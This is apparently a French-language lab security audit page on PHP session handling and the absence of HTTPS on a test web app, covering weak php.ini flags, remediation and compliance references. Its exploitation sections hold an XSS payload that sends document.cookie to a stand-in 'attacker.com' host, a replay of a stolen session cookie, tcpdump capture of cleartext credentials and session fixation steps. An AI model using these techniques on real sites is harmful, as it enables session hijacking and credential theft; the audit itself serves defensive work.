---
title: Gestion des sessions et HTTPS
sidebar_label:  Sessions
sidebar_position: 3
---

# Gestion des sessions et HTTPS

## Vue d'ensemble

Analyse de la gestion des sessions PHP et de l'absence de chiffrement HTTPS.

**Protocole actuel:** HTTP uniquement (port 80)  
**Sessions:** PHP natives sans flags de sécurité  
**Cookies:** Non sécurisés

---

## 7.3.1 Configuration PHP Sessions

### Machine: MainServer
### Fichier: `/etc/php/8.3/apache2/php.ini`

```bash
cat /etc/php/8.3/apache2/php.ini | grep -A 20 "^\[Session\]"
```

**Paramètres critiques:**

```ini
[Session]
session.save_handler = files
session.save_path = "/var/lib/php/sessions"
session.use_strict_mode = 0           ⚠️ CRITIQUE
session.cookie_httponly = 0           ⚠️ CRITIQUE
session.cookie_secure = 0             ⚠️ CRITIQUE
session.cookie_samesite = ""          ⚠️ HAUTE
session.gc_maxlifetime = 1440         
```

**Vulnérabilités:**

| Paramètre | Valeur | Risque | Recommandation |
|-----------|--------|--------|----------------|
| `use_strict_mode` | 0 | **CRITIQUE** | Session fixation | 1 |
| `cookie_httponly` | 0 | **CRITIQUE** | XSS → Vol cookie | 1 |
| `cookie_secure` | 0 | **CRITIQUE** | Interception HTTP | 1 |
| `cookie_samesite` | "" | **HAUTE** | CSRF | "Strict" ou "Lax" |
| `gc_maxlifetime` | 1440 | MOYENNE | Session 24min | 900 (15min) |

---

## 7.3.2 Test des cookies en pratique

### Machine: Kali Linux
### Commande:

```bash
# Connexion et capture du cookie
curl -X POST http://192.168.112.141/atlastech/login.php \
  -d "login=1&utilisateur=admin&mot_de_passe=admin123" \
  -c cookies.txt -v 2>&1 | grep "Set-Cookie"
```

**Résultat:**

```
< Set-Cookie: PHPSESSID=abc123def456; path=/
```

**Analyse du cookie:**

| Attribut | Présent ? | Conséquence |
|----------|-----------|-------------|
| `HttpOnly` |  | JavaScript peut lire `document.cookie` |
| `Secure` |  | Cookie transmis sur HTTP (non chiffré) |
| `SameSite` |  | CSRF possible depuis sites tiers |
| `Domain` |  | Par défaut (OK) |
| `Expires` |  | Session cookie (OK) |

---

## 7.3.3 Exploitation - Vol de cookie via XSS

**Scénario complet:**

```javascript
// Page malveillante avec XSS payload
// URL: http://192.168.112.141/atlastech/search.php?q=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>

// Cookie PHPSESSID accessible car HttpOnly=0
// Attaquant récupère: PHPSESSID=abc123def456

// Attaquant utilise le cookie volé
curl -b "PHPSESSID=abc123def456" http://192.168.112.141/atlastech/dashboard.php
```

**Résultat:** Accès complet au compte de la victime.

---

## 7.3.4 HTTPS - Absence complète

### Test port 443

```bash
# Machine: Kali Linux
nmap -p 443 192.168.112.141
```

**Résultat:**

```
443/tcp closed https
```

**Vérification Apache:**

```bash
# Machine: MainServer
ls -la /etc/apache2/sites-enabled/
```

**Résultat:**

```
000-default.conf -> ../sites-available/000-default.conf
```

**Contenu 000-default.conf:**

```apache
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html
    # Pas de VirtualHost *:443
</VirtualHost>
```

**Conséquence:** Tout le trafic (credentials, cookies, données) transite **en clair**.

---

## 7.3.5 Interception réseau - Démonstration

### Machine: Kali Linux (attaquant sur le même réseau)
### Tool: Wireshark / tcpdump

```bash
# Capture du trafic HTTP sur interface eth0
sudo tcpdump -i eth0 -A 'host 192.168.112.141 and port 80'
```

**Pendant qu'un utilisateur se connecte:**

**Trafic capturé:**

```
POST /atlastech/login.php HTTP/1.1
Host: 192.168.112.141
Content-Type: application/x-www-form-urlencoded

login=1&utilisateur=admin&mot_de_passe=admin123

HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=abc123def456; path=/
Location: dashboard.php
```

**Résultat:** Attaquant obtient:
- Identifiant: `admin`
- Mot de passe: `admin123`
- Cookie de session: `abc123def456`

**Temps requis:** < 1 seconde

---

## 7.3.6 Session Fixation

**Mécanisme:**

1. Attaquant génère un PHPSESSID valide: `http://192.168.112.141/atlastech/login.php` → `PHPSESSID=attacker123`
2. Attaquant force la victime à utiliser ce PHPSESSID: `http://192.168.112.141/atlastech/login.php?PHPSESSID=attacker123`
3. Victime se connecte avec `PHPSESSID=attacker123`
4. Attaquant utilise `PHPSESSID=attacker123` et accède au compte victime

**Cause:** `session.use_strict_mode = 0` (accepte les PHPSESSID externes)

---

## 7.3.7 Recommandations

**Immédiates:**

1. **Activer HTTPS** (Let's Encrypt gratuit)
2. **php.ini:**
   ```ini
   session.use_strict_mode = 1
   session.cookie_httponly = 1
   session.cookie_secure = 1
   session.cookie_samesite = "Strict"
   ```
3. **Régénération ID après login:**
   ```php
   session_regenerate_id(true);
   ```

**Score CVSS: 8.2 (HAUTE)**

**Conformité:**
- OWASP A07:2021 - Identification and Authentication Failures 
- PCI DSS 4.1 - Chiffrement transmission 
- RGPD Art. 32 - Chiffrement données personnelles 

---